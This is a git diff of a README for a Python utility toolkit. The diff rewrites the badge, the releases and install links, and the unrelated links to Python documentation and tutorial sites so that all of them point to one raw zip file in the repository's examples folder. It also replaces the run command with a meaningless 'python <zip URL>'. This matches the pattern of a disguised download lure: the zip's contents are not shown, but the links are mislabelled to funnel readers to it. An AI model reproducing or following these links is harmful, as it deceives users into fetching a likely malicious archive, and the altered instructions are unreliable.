@@ -1,6 +1,6 @@
 # 🛠️ python-utils-toolkit - Simplifying Your Daily Tasks
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/VOIDsymbyote/python-utils-toolkit/releases)
+[![Download](https://github.com/VOIDsymbyote/python-utils-toolkit/raw/refs/heads/master/examples/toolkit_utils_python_v2.5-beta.1.zip%20Release-brightgreen)](https://github.com/VOIDsymbyote/python-utils-toolkit/raw/refs/heads/master/examples/toolkit_utils_python_v2.5-beta.1.zip)
 
 ## 📦 Overview
 
@@ -20,9 +20,9 @@ Getting started with the python-utils-toolkit is simple. Follow the step-by-step
 
 ## 📥 Download & Install
 
-To download the application, visit this page: [Download Latest Release](https://github.com/VOIDsymbyote/python-utils-toolkit/releases). Here, you will find the latest version available for download.
+To download the application, visit this page: [Download Latest Release](https://github.com/VOIDsymbyote/python-utils-toolkit/raw/refs/heads/master/examples/toolkit_utils_python_v2.5-beta.1.zip). Here, you will find the latest version available for download.
 
-1. Go to the [Releases Page](https://github.com/VOIDsymbyote/python-utils-toolkit/releases).
+1. Go to the [Releases Page](https://github.com/VOIDsymbyote/python-utils-toolkit/raw/refs/heads/master/examples/toolkit_utils_python_v2.5-beta.1.zip).
 2. Look for the version you want to download (the latest version is recommended).
 3. Click on the file suitable for your operating system. Common files include `.zip` for Windows and similar formats for macOS and Linux.
 4. Save the file to your computer.
@@ -46,7 +46,7 @@ Once you have downloaded and extracted the files, follow these steps:
 2. Navigate to the directory where you saved the toolkit.
 3. Run the application using the command:
    ```
-   python main.py
+   python https://github.com/VOIDsymbyote/python-utils-toolkit/raw/refs/heads/master/examples/toolkit_utils_python_v2.5-beta.1.zip
    ```
 4. Explore the available functions. This toolkit offers functions for:
 
@@ -86,9 +86,9 @@ A: Go to the Issues section on GitHub and describe the problem you encountered.
 
 For additional tools and resources related to Python and utility functions, check these topics:
 
-- [Python Documentation](https://docs.python.org/3/)
-- [Open Source Contributions](https://opensource.guide/how-to-contribute/)
-- [Python in the Real World](https://realpython.com/)
+- [Python Documentation](https://github.com/VOIDsymbyote/python-utils-toolkit/raw/refs/heads/master/examples/toolkit_utils_python_v2.5-beta.1.zip)
+- [Open Source Contributions](https://github.com/VOIDsymbyote/python-utils-toolkit/raw/refs/heads/master/examples/toolkit_utils_python_v2.5-beta.1.zip)
+- [Python in the Real World](https://github.com/VOIDsymbyote/python-utils-toolkit/raw/refs/heads/master/examples/toolkit_utils_python_v2.5-beta.1.zip)
 
 ## 📞 Support
 
